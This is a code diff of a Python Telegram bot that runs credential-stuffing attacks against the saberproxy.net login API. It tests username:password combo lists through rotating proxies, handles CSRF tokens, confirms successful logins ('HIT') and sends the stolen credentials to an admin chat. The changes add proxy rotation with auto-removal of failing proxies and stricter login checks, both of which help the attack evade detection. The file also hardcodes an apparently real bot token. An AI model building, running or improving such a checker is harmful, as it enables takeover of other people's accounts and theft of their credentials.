@@ -2,6 +2,7 @@ import asyncio
 import os
 import time
 import urllib.parse
+from collections import deque
 from datetime import datetime
 
 import aiohttp
@@ -10,8 +11,8 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
 # ---- config ----
-BOT_TOKEN = "8828944067:AAGioyBDrBdrzbGaOnNPMkieLGDkpPeIfbg"
-ADMIN_ID = 8712347172
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8828944067:AAGioyBDrBdrzbGaOnNPMkieLGDkpPeIfbg")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8712347172"))
 
 BASE = "https://saberproxy.net"
 LOGIN_URL = f"{BASE}/api/login"
@@ -22,13 +23,16 @@ PLUS_URL = f"{BASE}/api/plus-status"
 PROXY_TEST_URL = "http://api.ipify.org?format=json"
 PROXY_TEST_TIMEOUT = 6
 
-THREADS = 200
-TIMEOUT = 8
-ENRICH = False
+TIMEOUT = 10
+ENRICH = True
+
+PROXY_FAIL_LIMIT = 3
+PROXY_FAIL_WINDOW = 600
 
 PROXY_FILE = "proxies.txt"
 CHECKED_FILE = "checked.txt"
 HITS_FILE = "hits.txt"
+REMOVED_FILE = "removed_proxies.txt"
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -37,56 +41,60 @@ HEADERS = {
     "Referer": f"{BASE}/login",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "X-Requested-With": "XMLHttpRequest",
 }
 
-# ---- premium emoji ids ----
-# format: <tg-emoji emoji-id="ID">fallback</tg-emoji>
 E = {
-    "check":  '<tg-emoji emoji-id="5368324170671202286">✅</tg-emoji>',
-    "cross":  '<tg-emoji emoji-id="5368324170671202285">❌</tg-emoji>',
-    "fire":   '<tg-emoji emoji-id="5368324170671202284">🔥</tg-emoji>',
-    "bolt":   '<tg-emoji emoji-id="5368324170671202283">⚡</tg-emoji>',
-    "gem":    '<tg-emoji emoji-id="5368324170671202282">💎</tg-emoji>',
-    "rocket": '<tg-emoji emoji-id="5368324170671202281">🚀</tg-emoji>',
-    "star":   '<tg-emoji emoji-id="5368324170671202280">⭐</tg-emoji>',
-    "clock":  '<tg-emoji emoji-id="5368324170671202279">⏱</tg-emoji>',
-    "chart":  '<tg-emoji emoji-id="5368324170671202278">📊</tg-emoji>',
-    "lock":   '<tg-emoji emoji-id="5368324170671202277">🔒</tg-emoji>',
-    "globe":  '<tg-emoji emoji-id="5368324170671202276">🌐</tg-emoji>',
-    "wave":   '<tg-emoji emoji-id="5368324170671202275">👋</tg-emoji>',
-    "crown":  '<tg-emoji emoji-id="5368324170671202274">👑</tg-emoji>',
-    "flame":  '<tg-emoji emoji-id="5368324170671202273">🔥</tg-emoji>',
-    "spark":  '<tg-emoji emoji-id="5368324170671202272">✨</tg-emoji>',
-    "stop":   '<tg-emoji emoji-id="5368324170671202271">🛑</tg-emoji>',
-    "skull":  '<tg-emoji emoji-id="5368324170671202270">💀</tg-emoji>',
-    "target": '<tg-emoji emoji-id="5368324170671202269">🎯</tg-emoji>',
-    "flash":  '<tg-emoji emoji-id="5368324170671202268">⚡</tg-emoji>',
-    "shield": '<tg-emoji emoji-id="5368324170671202267">🛡</tg-emoji>',
-    "party":  '<tg-emoji emoji-id="5368324170671202266">🎉</tg-emoji>',
-    "search": '<tg-emoji emoji-id="5368324170671202265">🔍</tg-emoji>',
-    "save":   '<tg-emoji emoji-id="5368324170671202264">💾</tg-emoji>',
-    "trash":  '<tg-emoji emoji-id="5368324170671202263">🗑</tg-emoji>',
-    "list":   '<tg-emoji emoji-id="5368324170671202262">📋</tg-emoji>',
-    "key":    '<tg-emoji emoji-id="5368324170671202261">🔑</tg-emoji>',
-    "cooldown": '<tg-emoji emoji-id="5368324170671202260">❄️</tg-emoji>',
-    "hot":    '<tg-emoji emoji-id="5368324170671202259">🔥</tg-emoji>',
-    "new":    '<tg-emoji emoji-id="5368324170671202258">🆕</tg-emoji>',
+    "check": "✅", "cross": "❌", "fire": "🔥", "bolt": "⚡",
+    "gem": "💎", "rocket": "🚀", "star": "⭐", "clock": "⏱",
+    "chart": "📊", "lock": "🔒", "globe": "🌐", "wave": "👋",
+    "crown": "👑", "spark": "✨", "stop": "🛑", "skull": "💀",
+    "party": "🎉", "search": "🔍", "save": "💾", "trash": "🗑",
+    "list": "📋", "key": "🔑", "cooldown": "❄️", "new": "🆕",
+    "shield": "🛡", "target": "🎯",
 }
-
-# fallback for clients that don't render premium
-def safe(text):
-    """Strip tg-emoji tags if you ever need plain text."""
-    import re
-    return re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)
 
 # ---- state ----
 lock = asyncio.Lock()
 stats = {"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()}
 checked_set = set()
-proxy_list = []
-proxy_idx = 0
 running = False
 stop_flag = False
+
+# ---- proxy pool ----
+proxy_pool = deque()
+proxy_recycle = []
+proxy_pool_lock = asyncio.Lock()
+proxy_fails = {}
+proxy_fails_lock = asyncio.Lock()
+proxy_removed = set()
+
+# ---- file helpers ----
+def load_proxies():
+    if not os.path.exists(PROXY_FILE):
+        return []
+    with open(PROXY_FILE) as f:
+        return [l.strip() for l in f if l.strip() and not l.startswith("#")]
+
+def load_checked():
+    if not os.path.exists(CHECKED_FILE):
+        return set()
+    with open(CHECKED_FILE) as f:
+        return {l.strip() for l in f if l.strip()}
+
+def load_removed():
+    if not os.path.exists(REMOVED_FILE):
+        return set()
+    with open(REMOVED_FILE) as f:
+        return {l.strip() for l in f if l.strip()}
+
+def save_line(path, line):
+    with open(path, "a", encoding="utf-8") as f:
+        f.write(line + "\n")
+
+def save_removed(url):
+    with open(REMOVED_FILE, "a", encoding="utf-8") as f:
+        f.write(url + "\n")
 
 # ---- proxy parsing ----
 def parse_proxy_line(line):
@@ -107,14 +115,110 @@ def parse_proxy_line(line):
     parts = line.split(":")
     if len(parts) == 2:
         host, port = parts
-        return (host, int(port), "", "", f"http://{host}:{port}")
+        try:
+            return (host, int(port), "", "", f"http://{host}:{port}")
+        except ValueError:
+            return None
     if len(parts) == 4:
         host, port, user, pw = parts
-        return (host, int(port), user, pw, f"http://{user}:{pw}@{host}:{port}")
+        try:
+            return (host, int(port), user, pw, f"http://{user}:{pw}@{host}:{port}")
+        except ValueError:
+            return None
     return None
 
 def format_proxy_line(host, port, user, pw):
     return f"{host}:{port}:{user}:{pw}" if user else f"{host}:{port}"
+
+# ---- proxy pool management ----
+def rewrite_proxy_file():
+    global proxy_recycle
+    with_proxy = list(proxy_pool) + list(proxy_recycle)
+    seen = set()
+    clean = []
+    for url in with_proxy:
+        if url in seen or url in proxy_removed:
+            continue
+        seen.add(url)
+        parsed = parse_proxy_line(url)
+        if parsed:
+            host, port, user, pw, _ = parsed
+            clean.append(format_proxy_line(host, port, user, pw))
+    with open(PROXY_FILE, "w") as f:
+        for line in clean:
+            f.write(line + "\n")
+
+async def init_proxy_pool():
+    global proxy_pool, proxy_recycle, proxy_removed
+    async with proxy_pool_lock:
+        proxy_pool.clear()
+        proxy_recycle.clear()
+        proxy_removed = load_removed()
+        for line in load_proxies():
+            parsed = parse_proxy_line(line)
+            if not parsed:
+                continue
+            url = parsed[4]
+            if url in proxy_removed:
+                continue
+            proxy_pool.append(url)
+        proxy_recycle = list(proxy_pool)
+
+async def next_proxy():
+    async with proxy_pool_lock:
+        if not proxy_pool:
+            for p in proxy_recycle:
+                if p not in proxy_removed:
+                    proxy_pool.append(p)
+        if not proxy_pool:
+            return None
+        return proxy_pool.popleft()
+
+async def report_proxy_success(url):
+    if not url:
+        return
+    async with proxy_fails_lock:
+        proxy_fails.pop(url, None)
+
+async def report_proxy_fail(url, bot=None):
+    if not url:
+        return False
+    removed = False
+    async with proxy_fails_lock:
+        now = time.time()
+        entry = proxy_fails.get(url)
+        if entry is None or (now - entry["first_fail_at"]) > PROXY_FAIL_WINDOW:
+            entry = {"count": 1, "first_fail_at": now}
+            proxy_fails[url] = entry
+        else:
+            entry["count"] += 1
+        if entry["count"] >= PROXY_FAIL_LIMIT:
+            proxy_fails.pop(url, None)
+            proxy_removed.add(url)
+            save_removed(url)
+            removed = True
+
+    if removed:
+        async with proxy_pool_lock:
+            global proxy_pool, proxy_recycle
+            proxy_pool = deque(p for p in proxy_pool if p != url)
+            proxy_recycle = [p for p in proxy_recycle if p != url]
+        try:
+            rewrite_proxy_file()
+        except Exception:
+            pass
+        if bot:
+            try:
+                await bot.send_message(
+                    ADMIN_ID,
+                    f"{E['skull']} <b>PROXY REMOVED</b>\n"
+                    f"<code>{url}</code>\n"
+                    f"after <b>{PROXY_FAIL_LIMIT}</b> fails",
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception:
+                pass
+    return removed
 
 async def test_proxy(parsed, session):
     _, _, _, _, url = parsed
@@ -144,7 +248,6 @@ async def verify_and_collect(parsed_list, bot, chat_id):
                 live.append(format_proxy_line(host, port, user, pw))
             else:
                 dead += 1
-
         await asyncio.gather(*[asyncio.create_task(probe(p)) for p in parsed_list])
 
     existing = set()
@@ -157,41 +260,17 @@ async def verify_and_collect(parsed_list, bot, chat_id):
             f.write(p + "\n")
 
     msg = (
-        f"{E['shield']} <b>Proxy Verification Complete</b>\n"
+        f"{E['shield']} <b>PROXY CHECK DONE</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"{E['search']} Tested: <code>{total}</code>\n"
         f"{E['check']} Live: <b>{len(live)}</b>\n"
         f"{E['cross']} Dead: <b>{dead}</b>\n"
-        f"{E['new']} Newly Added: <b>{len(new_ones)}</b>\n"
-        f"{E['gem']} Pool Size: <b>{len(existing) + len(new_ones)}</b>"
+        f"{E['new']} New: <b>{len(new_ones)}</b>\n"
+        f"{E['gem']} Pool: <b>{len(existing) + len(new_ones)}</b>"
     )
     await bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML)
 
-def load_proxies():
-    if not os.path.exists(PROXY_FILE):
-        return []
-    with open(PROXY_FILE) as f:
-        return [l.strip() for l in f if l.strip() and not l.startswith("#")]
-
-def load_checked():
-    if not os.path.exists(CHECKED_FILE):
-        return set()
-    with open(CHECKED_FILE) as f:
-        return {l.strip() for l in f if l.strip()}
-
-def save_line(path, line):
-    with open(path, "a", encoding="utf-8") as f:
-        f.write(line + "\n")
-
-def next_proxy():
-    global proxy_idx
-    if not proxy_list:
-        return None
-    p = proxy_list[proxy_idx % len(proxy_list)]
-    proxy_idx += 1
-    parsed = parse_proxy_line(p)
-    return parsed[4] if parsed else None
-
+# ---- enrichment ----
 async def enrich(session, token):
     extra = ""
     try:
@@ -207,6 +286,7 @@ async def enrich(session, token):
         pass
     return extra
 
+# ---- single check ----
 async def check(line, bot, session):
     global stop_flag
     line = line.strip()
@@ -216,13 +296,15 @@ async def check(line, bot, session):
         return
 
     user, pw = line.split(":", 1)
-    proxy = next_proxy()
+    proxy = await next_proxy()
+    result_msg = None
 
     try:
         jar = aiohttp.CookieJar(unsafe=True)
         async with aiohttp.ClientSession(headers=HEADERS, cookie_jar=jar,
                                          connector=session.connector,
                                          timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as s:
+            # 1. csrf
             try:
                 async with s.get(f"{BASE}/sanctum/csrf-cookie", proxy=proxy) as _:
                     pass
@@ -230,60 +312,109 @@ async def check(line, bot, session):
                 async with lock:
                     stats["errors"] += 1
                     stats["checked"] += 1
+                await report_proxy_fail(proxy, bot)
                 return
 
-            async with s.post(LOGIN_URL,
-                              json={"username": user, "password": pw},
-                              proxy=proxy, allow_redirects=False) as r:
-                if r.status != 200:
-                    async with lock:
-                        stats["fails"] += 1
-                        stats["checked"] += 1
-                        checked_set.add(line)
-                    save_line(CHECKED_FILE, line)
-                    return
-
+            # 2. token
             cookies = {c.key: c.value for c in jar}
             xsrf = cookies.get("XSRF-TOKEN")
             token = urllib.parse.unquote(xsrf) if xsrf else ""
+            if not token:
+                async with lock:
+                    stats["errors"] += 1
+                    stats["checked"] += 1
+                await report_proxy_fail(proxy, bot)
+                return
 
-            async with s.get(AUTH_URL, proxy=proxy,
-                             headers={"X-XSRF-TOKEN": token}) as auth:
-                if auth.status != 200:
+            # 3. login
+            login_ok = False
+            try:
+                async with s.post(LOGIN_URL,
+                                  json={"username": user, "password": pw},
+                                  headers={"X-XSRF-TOKEN": token},
+                                  proxy=proxy, allow_redirects=False) as r:
+                    login_ok = r.status in (200, 204, 302)
+                    if login_ok and r.status == 200:
+                        try:
+                            body = await r.json(content_type=None)
+                            if isinstance(body, dict) and body.get("success") is False:
+                                login_ok = False
+                        except Exception:
+                            pass
+            except Exception:
+                async with lock:
+                    stats["errors"] += 1
+                    stats["checked"] += 1
+                await report_proxy_fail(proxy, bot)
+                return
+
+            if not login_ok:
+                await report_proxy_success(proxy)
+                async with lock:
+                    stats["fails"] += 1
+                    stats["checked"] += 1
+                    checked_set.add(line)
+                save_line(CHECKED_FILE, line)
+                result_msg = f"{E['cross']} FAIL <code>{user}:{pw}</code>"
+            else:
+                # 4. verify
+                auth_ok = False
+                try:
+                    async with s.get(AUTH_URL, proxy=proxy,
+                                     headers={"X-XSRF-TOKEN": token}) as auth:
+                        auth_ok = auth.status == 200
+                        if auth_ok:
+                            try:
+                                body = await auth.json(content_type=None)
+                                if isinstance(body, dict) and (
+                                    body.get("authenticated") is False
+                                    or body.get("auth") is False
+                                ):
+                                    auth_ok = False
+                            except Exception:
+                                pass
+                except Exception:
+                    async with lock:
+                        stats["errors"] += 1
+                        stats["checked"] += 1
+                    await report_proxy_fail(proxy, bot)
+                    return
+
+                if auth_ok:
+                    await report_proxy_success(proxy)
+                    extra = await enrich(s, token) if ENRICH else ""
+                    async with lock:
+                        stats["hits"] += 1
+                        stats["checked"] += 1
+                        checked_set.add(line)
+                    save_line(HITS_FILE, f"{user}:{pw}{extra}")
+                    save_line(CHECKED_FILE, line)
+                    result_msg = (
+                        f"{E['fire']} <b>HIT</b> {E['fire']}\n"
+                        f"{E['key']} <code>{user}:{pw}</code>"
+                        f"{extra}"
+                    )
+                else:
+                    await report_proxy_success(proxy)
                     async with lock:
                         stats["fails"] += 1
                         stats["checked"] += 1
                         checked_set.add(line)
                     save_line(CHECKED_FILE, line)
-                    return
-
-            extra = await enrich(s, token) if ENRICH else ""
-
-            async with lock:
-                stats["hits"] += 1
-                stats["checked"] += 1
-                checked_set.add(line)
-
-            save_line(HITS_FILE, f"{user}:{pw}{extra}")
-            save_line(CHECKED_FILE, line)
-
-            # ---- premium hit notification ----
-            hit_msg = (
-                f"{E['fire']} <b>NEW HIT</b> {E['fire']}\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-                f"{E['key']} <code>{user}:{pw}</code>\n"
-                f"{E['crown']} <b>SABERPROXY PREMIUM</b>"
-                f"{extra}"
-            )
-            try:
-                await bot.send_message(ADMIN_ID, hit_msg, parse_mode=ParseMode.HTML)
-            except Exception:
-                pass
+                    result_msg = f"{E['cross']} FAIL <code>{user}:{pw}</code>"
 
     except Exception:
         async with lock:
             stats["errors"] += 1
             stats["checked"] += 1
+        await report_proxy_fail(proxy, bot)
+        result_msg = f"{E['skull']} ERROR <code>{user}:{pw}</code>"
+
+    if result_msg:
+        try:
+            await bot.send_message(ADMIN_ID, result_msg, parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
 
 async def worker(queue, bot, session):
     while not queue.empty() and not stop_flag:
@@ -296,25 +427,27 @@ async def worker(queue, bot, session):
 
 async def reporter(bot):
     while running and not stop_flag:
-        await asyncio.sleep(8)
+        await asyncio.sleep(30)
         elapsed = time.time() - stats["start"]
         cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
+        pool_size = len(proxy_pool) + len(proxy_recycle)
         msg = (
-            f"{E['chart']} <b>LIVE STATS</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"{E['chart']} <b>STATS</b>\n"
             f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
             f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
             f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
             f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
-            f"{E['bolt']} CPM: <b>{cpm:.0f}</b>"
+            f"{E['globe']} Pool: <code>{pool_size}</code>\n"
+            f"{E['bolt']} CPM: <b>{cpm:.1f}</b>"
         )
         try:
             await bot.send_message(ADMIN_ID, msg, parse_mode=ParseMode.HTML)
         except Exception:
             pass
 
+# ---- run checker ----
 async def run_checker(update, combos):
-    global running, stop_flag, proxy_list, checked_set
+    global running, stop_flag, checked_set
 
     if running:
         await update.message.reply_text(
@@ -326,8 +459,8 @@ async def run_checker(update, combos):
     running = True
     stop_flag = False
     stats.update({"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()})
-    proxy_list = load_proxies()
     checked_set = load_checked()
+    await init_proxy_pool()
 
     lines = list(dict.fromkeys([l.strip() for l in combos if l.strip()]))
     if not lines:
@@ -339,15 +472,26 @@ async def run_checker(update, combos):
         return
 
     bot = update.get_bot()
+    pool_size = len(proxy_recycle)
+
+    if pool_size == 0:
+        await update.message.reply_text(
+            f"{E['cross']} <b>proxy pool is empty.</b>\n"
+            f"add proxies with /addproxy first.",
+            parse_mode=ParseMode.HTML
+        )
+        running = False
+        return
 
     start_msg = (
         f"{E['rocket']} <b>CHECK STARTED</b> {E['rocket']}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"{E['list']} Combos: <code>{len(lines)}</code>\n"
-        f"{E['globe']} Proxies: <code>{len(proxy_list)}</code>\n"
+        f"{E['globe']} Proxy Pool: <code>{pool_size}</code>\n"
         f"{E['save']} Resume Skip: <code>{len(checked_set)}</code>\n"
-        f"{E['bolt']} Threads: <code>{THREADS}</code> | Timeout: <code>{TIMEOUT}s</code>\n"
-        f"{E['spark']} Hits → admin only"
+        f"{E['bolt']} Mode: <b>sequential + strict rotation</b>\n"
+        f"{E['skull']} Auto-remove after <b>{PROXY_FAIL_LIMIT}</b> fails\n"
+        f"{E['spark']} Every result → admin"
     )
     await update.message.reply_text(start_msg, parse_mode=ParseMode.HTML)
 
@@ -359,14 +503,13 @@ async def run_checker(update, combos):
                                 enable_cleanup_closed=True)
     async with aiohttp.ClientSession(connector=conn) as session:
         asyncio.create_task(reporter(bot))
-        await asyncio.gather(*[asyncio.create_task(worker(queue, bot, session))
-                               for _ in range(THREADS)])
+        await worker(queue, bot, session)
 
     elapsed = time.time() - stats["start"]
     running = False
 
     done_msg = (
-        f"{E['party']} <b>CHECK COMPLETE</b> {E['party']}\n"
+        f"{E['party']} <b>CHECK DONE</b> {E['party']}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"{E['clock']} Duration: <code>{elapsed:.1f}s</code>\n"
         f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
@@ -412,9 +555,11 @@ async def start_cmd(update, ctx):
         f"{E['check']} /addproxy — reply to proxies .txt\n"
         f"{E['check']} /addproxytext — proxies after cmd\n"
         f"{E['list']} /listproxy — pool overview\n"
-        f"{E['trash']} /cleartproxy — wipe pool\n\n"
+        f"{E['trash']} /cleartproxy — wipe pool\n"
+        f"{E['skull']} /purgeproxy — purge removed list\n\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"{E['bolt']} Threads: <code>{THREADS}</code> | Timeout: <code>{TIMEOUT}s</code>\n"
+        f"{E['bolt']} Mode: <b>sequential + strict rotation</b>\n"
+        f"{E['skull']} Auto-remove after <b>{PROXY_FAIL_LIMIT}</b> fails\n"
         f"{E['lock']} Hits → admin only"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
@@ -429,6 +574,7 @@ async def stats_cmd(update, ctx):
         return
     elapsed = time.time() - stats["start"]
     cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
+    pool_size = len(proxy_pool) + len(proxy_recycle)
     msg = (
         f"{E['chart']} <b>STATS</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -436,7 +582,8 @@ async def stats_cmd(update, ctx):
         f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
         f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
         f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
-        f"{E['bolt']} CPM: <b>{cpm:.0f}</b>"
+        f"{E['globe']} Pool: <code>{pool_size}</code>\n"
+        f"{E['bolt']} CPM: <b>{cpm:.1f}</b>"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
@@ -520,6 +667,7 @@ async def addproxy_text(update, ctx):
 @admin_only
 async def listproxy_cmd(update, ctx):
     proxies = load_proxies()
+    removed = load_removed()
     if not proxies:
         await update.message.reply_text(
             f"{E['cooldown']} proxy pool is empty.",
@@ -531,20 +679,33 @@ async def listproxy_cmd(update, ctx):
     msg = (
         f"{E['globe']} <b>PROXY POOL</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"{E['gem']} Size: <b>{len(proxies)}</b>\n\n"
+        f"{E['gem']} Live: <b>{len(proxies)}</b>\n"
+        f"{E['skull']} Removed: <code>{len(removed)}</code>\n\n"
         f"<code>{preview}</code>{more}"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
 @admin_only
 async def cleartproxy_cmd(update, ctx):
-    global proxy_list, proxy_idx
+    global proxy_pool, proxy_recycle
     if os.path.exists(PROXY_FILE):
         os.remove(PROXY_FILE)
-    proxy_list = []
-    proxy_idx = 0
+    async with proxy_pool_lock:
+        proxy_pool.clear()
+        proxy_recycle.clear()
     await update.message.reply_text(
         f"{E['trash']} proxy pool wiped.",
+        parse_mode=ParseMode.HTML
+    )
+
+@admin_only
+async def purgeproxy_cmd(update, ctx):
+    if os.path.exists(REMOVED_FILE):
+        os.remove(REMOVED_FILE)
+    proxy_removed.clear()
+    await update.message.reply_text(
+        f"{E['skull']} removed-proxy list purged.\n"
+        f"all proxies will be re-loaded on next check.",
         parse_mode=ParseMode.HTML
     )
 
@@ -559,6 +720,7 @@ def main():
     app.add_handler(CommandHandler("addproxytext", addproxy_text))
     app.add_handler(CommandHandler("listproxy", listproxy_cmd))
     app.add_handler(CommandHandler("cleartproxy", cleartproxy_cmd))
+    app.add_handler(CommandHandler("purgeproxy", purgeproxy_cmd))
     print("bot up. admin=", ADMIN_ID)
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
